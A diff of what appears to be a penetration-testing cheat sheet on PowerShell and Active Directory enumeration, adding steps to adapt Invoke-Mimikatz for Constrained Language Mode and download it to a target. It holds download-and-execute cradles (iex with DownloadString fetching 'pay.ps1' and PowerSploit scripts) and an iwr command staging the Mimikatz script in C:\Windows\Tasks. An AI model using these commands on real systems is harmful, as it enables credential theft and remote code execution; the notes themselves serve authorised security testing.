@@ -71,6 +71,10 @@ $ExecutionContext.SessionState.LanguageMode = 'fulllanguage' ==> Not really poss
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
 ```
 
+**Invoke-mimikatz when Constrained Language mode is in place**
+
+So, we must modify Invoke-Mimikatz.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimikatzEx.ps1) to the target server.
+
 ### Execute .PS1 File / PowerView
 
 {% code overflow="wrap" %}
@@ -84,10 +88,10 @@ iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Rec
 
 Download [https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)
 
-```powershell
-Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
-Import-Module .\ActiveDirectory\ActiveDirectory.psd1
-```
+<pre class="language-powershell"><code class="lang-powershell"><strong>cd ADModule-master
+</strong><strong>Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose
+</strong>Import-Module .\ActiveDirectory\ActiveDirectory.psd1
+</code></pre>
 
 {% hint style="info" %}
 Most of the AD Modules have the -Filter -Properties and -Identity options!
@@ -98,9 +102,6 @@ Get-AD-User -Identity username1 -Properties \*
 
 {% code overflow="wrap" %}
 ```powershell
-
-
-
 iex (new-Object Net.WebClient).DownloadString('
 https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 
@@ -135,6 +136,14 @@ ls function:
 <strong>
 </strong><strong>iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
 </strong></code></pre>
+
+Download and save PowerShell Script
+
+{% code overflow="wrap" %}
+```powershell
+iwr http://172.16.x.x/Invoke-MimikatzEx.ps1 -OutFile C:\Windows\Tasks\Invoke-MimikatzEx.ps1
+```
+{% endcode %}
 
 #### &#x20;**Use a COM Object**
 
